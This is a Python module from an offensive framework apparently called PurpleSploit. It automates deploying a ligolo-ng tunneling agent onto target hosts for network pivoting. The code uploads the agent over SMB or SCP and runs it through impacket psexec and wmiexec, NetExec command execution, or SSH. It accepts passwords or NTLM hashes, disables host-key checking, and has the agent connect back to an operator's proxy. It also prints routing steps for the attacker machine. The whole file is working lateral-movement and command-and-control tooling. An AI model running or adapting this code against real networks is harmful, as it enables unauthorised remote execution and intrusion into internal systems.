"""
Ligolo Pivot Module

Automatically deploy and manage ligolo-ng agents for pivoting.
Supports multiple deployment methods: SMB, PSExec, WMIExec, SSH.
"""

from purplesploit.core.module import BaseModule
from typing import Dict, Any, List
import subprocess
import os
import time
from pathlib import Path


class LigoloPivotModule(BaseModule):
    """
    Ligolo Pivot - Deploy ligolo-ng agent for network pivoting.

    Deploys the ligolo-ng agent to a target system and establishes
    a pivot connection. Supports multiple deployment methods.
    """

    def __init__(self, framework):
        super().__init__(framework)

    @property
    def name(self) -> str:
        return "Ligolo Pivot"

    @property
    def description(self) -> str:
        return "Deploy and manage ligolo-ng agents for network pivoting"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "c2"

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target host IP address",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": False,
                "description": "Username for authentication",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": "",
                "required": False,
                "description": "Domain for Windows authentication",
                "default": ""
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash for authentication",
                "default": None
            },
            "SSH_KEY": {
                "value": None,
                "required": False,
                "description": "SSH private key path (for SSH deployment)",
                "default": None
            },
            "AGENT_BINARY": {
                "value": None,
                "required": False,
                "description": "Path to ligolo-ng agent binary",
                "default": None
            },
            "LIGOLO_SERVER": {
                "value": "127.0.0.1:11601",
                "required": False,
                "description": "Ligolo-ng proxy server address (IP:PORT)",
                "default": "127.0.0.1:11601"
            },
            "PIVOT_NETWORK": {
                "value": None,
                "required": False,
                "description": "Network to pivot to (e.g., 192.168.1.0/24)",
                "default": None
            },
            "AGENT_PORT": {
                "value": "11601",
                "required": False,
                "description": "Port for agent to connect back on",
                "default": "11601"
            },
            "TARGET_OS": {
                "value": "windows",
                "required": False,
                "description": "Target OS (windows, linux)",
                "default": "windows"
            }
        })

    def get_operations(self) -> List[Dict[str, Any]]:
        """Return list of ligolo deployment operations."""
        return [
            {
                "name": "Deploy via SMB",
                "description": "Upload agent via SMB and execute with PsExec",
                "handler": self.deploy_via_smb
            },
            {
                "name": "Deploy via PsExec",
                "description": "Deploy agent using Impacket psexec",
                "handler": self.deploy_via_psexec
            },
            {
                "name": "Deploy via WMIExec",
                "description": "Deploy agent using Impacket wmiexec",
                "handler": self.deploy_via_wmiexec
            },
            {
                "name": "Deploy via SSH",
                "description": "Deploy agent via SSH (Linux/Unix targets)",
                "handler": self.deploy_via_ssh
            },
            {
                "name": "Deploy via NetExec",
                "description": "Deploy agent using NetExec (nxc)",
                "handler": self.deploy_via_nxc
            },
            {
                "name": "List Connected Agents",
                "description": "Show all connected ligolo agents",
                "handler": self.list_agents
            },
            {
                "name": "Create Pivot Route",
                "description": "Create routing for pivot network",
                "handler": self.create_pivot_route
            }
        ]

    def deploy_via_smb(self) -> dict:
        """Deploy agent via SMB share upload."""
        self.log("Deploying ligolo agent via SMB...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        agent_binary = self.get_option("AGENT_BINARY")

        if not all([rhost, username, password, agent_binary]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, PASSWORD, AGENT_BINARY"
            }

        try:
            # Use smbclient to upload the agent
            share = "C$"
            remote_path = "\\Windows\\Temp\\ligolo-agent.exe"

            # Build smbclient command
            upload_cmd = [
                "smbclient",
                f"//{rhost}/{share}",
                "-U", f"{domain}/{username}%{password}",
                "-c", f"put {agent_binary} {remote_path}"
            ]

            self.log(f"Uploading agent to {rhost}...")
            result = subprocess.run(upload_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Failed to upload agent: {result.stderr}"
                }

            self.log("Agent uploaded successfully", "success")

            # Execute the agent using wmiexec or psexec
            return self.execute_agent_windows(rhost, username, password, domain, remote_path)

        except Exception as e:
            return {
                "success": False,
                "error": f"SMB deployment failed: {str(e)}"
            }

    def deploy_via_psexec(self) -> dict:
        """Deploy agent via Impacket psexec."""
        self.log("Deploying ligolo agent via PsExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        agent_binary = self.get_option("AGENT_BINARY")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, agent_binary]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, AGENT_BINARY"
            }

        try:
            # Build psexec command
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Upload and execute agent
            cmd = [
                "impacket-psexec",
                auth,
                "-c", agent_binary,
                f"ligolo-agent.exe -connect {ligolo_server} -ignore-cert"
            ]

            self.log(f"Executing via psexec: {' '.join(cmd[:2])}...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if "Impacket" in result.stdout or result.returncode == 0:
                self.log("Agent deployed successfully", "success")
                return {
                    "success": True,
                    "output": result.stdout,
                    "method": "psexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"PsExec deployment failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"PsExec deployment failed: {str(e)}"
            }

    def deploy_via_wmiexec(self) -> dict:
        """Deploy agent via Impacket wmiexec."""
        self.log("Deploying ligolo agent via WMIExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME"
            }

        try:
            # First, upload the agent via SMB
            agent_binary = self.get_option("AGENT_BINARY")
            if agent_binary:
                upload_result = self.upload_via_smb(rhost, username, password, domain, agent_binary)
                if not upload_result["success"]:
                    return upload_result
                remote_path = upload_result["remote_path"]
            else:
                # Assume agent is already on target
                remote_path = "C:\\Windows\\Temp\\ligolo-agent.exe"

            # Build wmiexec command
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                auth += f"@{rhost} -hashes :{hash_val}"
            elif password:
                auth += f":{password}@{rhost}"
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Execute agent via WMI
            cmd_to_run = f"{remote_path} -connect {ligolo_server} -ignore-cert"
            cmd = [
                "impacket-wmiexec",
                auth,
                cmd_to_run
            ]

            self.log(f"Executing via wmiexec...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0 or "Impacket" in result.stdout:
                self.log("Agent deployed successfully", "success")
                return {
                    "success": True,
                    "output": result.stdout,
                    "method": "wmiexec"
                }
            else:
                return {
                    "success": False,
                    "error": f"WMIExec deployment failed: {result.stderr}"
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"WMIExec deployment failed: {str(e)}"
            }

    def deploy_via_ssh(self) -> dict:
        """Deploy agent via SSH."""
        self.log("Deploying ligolo agent via SSH...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")
        agent_binary = self.get_option("AGENT_BINARY")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, agent_binary]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, AGENT_BINARY"
            }

        try:
            # Upload agent via SCP
            remote_path = "/tmp/ligolo-agent"

            if ssh_key:
                scp_cmd = [
                    "scp", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    agent_binary,
                    f"{username}@{rhost}:{remote_path}"
                ]
            else:
                # Use sshpass if password auth
                scp_cmd = [
                    "sshpass", "-p", password,
                    "scp", "-o", "StrictHostKeyChecking=no",
                    agent_binary,
                    f"{username}@{rhost}:{remote_path}"
                ]

            self.log(f"Uploading agent to {rhost}...")
            result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=30)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Failed to upload agent: {result.stderr}"
                }

            # Make executable and run
            if ssh_key:
                ssh_cmd = [
                    "ssh", "-i", ssh_key,
                    "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
                ]
            else:
                ssh_cmd = [
                    "sshpass", "-p", password,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    f"{username}@{rhost}",
                    f"chmod +x {remote_path} && nohup {remote_path} -connect {ligolo_server} -ignore-cert &"
                ]

            self.log("Executing agent on target...")
            result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30)

            self.log("Agent deployed successfully", "success")
            return {
                "success": True,
                "output": result.stdout,
                "method": "ssh"
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"SSH deployment failed: {str(e)}"
            }

    def deploy_via_nxc(self) -> dict:
        """Deploy agent via NetExec (nxc)."""
        self.log("Deploying ligolo agent via NetExec...")

        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        agent_binary = self.get_option("AGENT_BINARY")
        ligolo_server = self.get_option("LIGOLO_SERVER")

        if not all([rhost, username, agent_binary]):
            return {
                "success": False,
                "error": "Missing required options: RHOST, USERNAME, AGENT_BINARY"
            }

        try:
            # Build nxc command
            cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                cmd.extend(["-d", domain])

            if hash_val:
                cmd.extend(["-H", hash_val])
            elif password:
                cmd.extend(["-p", password])
            else:
                return {"success": False, "error": "No PASSWORD or HASH provided"}

            # Upload agent
            cmd.extend(["--put-file", agent_binary, "C:\\Windows\\Temp\\ligolo-agent.exe"])

            self.log(f"Uploading agent via nxc...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Failed to upload agent: {result.stderr}"
                }

            # Execute agent
            exec_cmd = ["nxc", "smb", rhost, "-u", username]

            if domain:
                exec_cmd.extend(["-d", domain])

            if hash_val:
                exec_cmd.extend(["-H", hash_val])
            else:
                exec_cmd.extend(["-p", password])

            exec_cmd.extend(["-x", f"C:\\Windows\\Temp\\ligolo-agent.exe -connect {ligolo_server} -ignore-cert"])

            self.log("Executing agent on target...")
            result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=30)

            self.log("Agent deployed successfully", "success")
            return {
                "success": True,
                "output": result.stdout,
                "method": "nxc"
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"NetExec deployment failed: {str(e)}"
            }

    def upload_via_smb(self, rhost, username, password, domain, local_file):
        """Helper to upload file via SMB."""
        share = "C$"
        remote_path = "Windows\\Temp\\ligolo-agent.exe"

        cmd = [
            "smbclient",
            f"//{rhost}/{share}",
            "-U", f"{domain}/{username}%{password}" if domain else f"{username}%{password}",
            "-c", f"put {local_file} {remote_path}"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode == 0:
            return {
                "success": True,
                "remote_path": f"C:\\{remote_path}"
            }
        else:
            return {
                "success": False,
                "error": f"Upload failed: {result.stderr}"
            }

    def execute_agent_windows(self, rhost, username, password, domain, remote_path):
        """Helper to execute agent on Windows target."""
        ligolo_server = self.get_option("LIGOLO_SERVER")

        # Use wmiexec to execute
        auth = f"{domain}/{username}:{password}@{rhost}" if domain else f"{username}:{password}@{rhost}"
        cmd = [
            "impacket-wmiexec",
            auth,
            f"{remote_path} -connect {ligolo_server} -ignore-cert"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode == 0 or "Impacket" in result.stdout:
            return {
                "success": True,
                "output": result.stdout
            }
        else:
            return {
                "success": False,
                "error": f"Execution failed: {result.stderr}"
            }

    def list_agents(self) -> dict:
        """List connected ligolo agents."""
        self.log("Listing connected agents...")

        # This would require interaction with ligolo proxy
        # For now, provide instructions
        self.log("To list agents, attach to ligolo session and run 'session'", "info")
        self.log("Use: ligolo (to attach), then type 'session'", "info")

        return {
            "success": True,
            "message": "Attach to ligolo session to list agents"
        }

    def create_pivot_route(self) -> dict:
        """Create routing for pivot network."""
        pivot_network = self.get_option("PIVOT_NETWORK")

        if not pivot_network:
            return {
                "success": False,
                "error": "PIVOT_NETWORK not specified (e.g., 192.168.1.0/24)"
            }

        self.log(f"To create pivot route for {pivot_network}:", "info")
        self.log("1. Attach to ligolo: ligolo", "info")
        self.log("2. Select agent: session", "info")
        self.log(f"3. Add route: listener_add --addr 0.0.0.0:11601", "info")
        self.log(f"4. Start tunnel: start", "info")
        self.log("", "info")
        self.log("On attacker machine:", "info")
        self.log(f"  sudo ip route add {pivot_network} dev ligolo", "info")

        return {
            "success": True,
            "message": f"Follow instructions to pivot to {pivot_network}"
        }

    def run(self) -> dict:
        """Run the selected operation."""
        # This would typically be called via operations
        return {
            "success": True,
            "message": "Select an operation to deploy ligolo agent"
        }
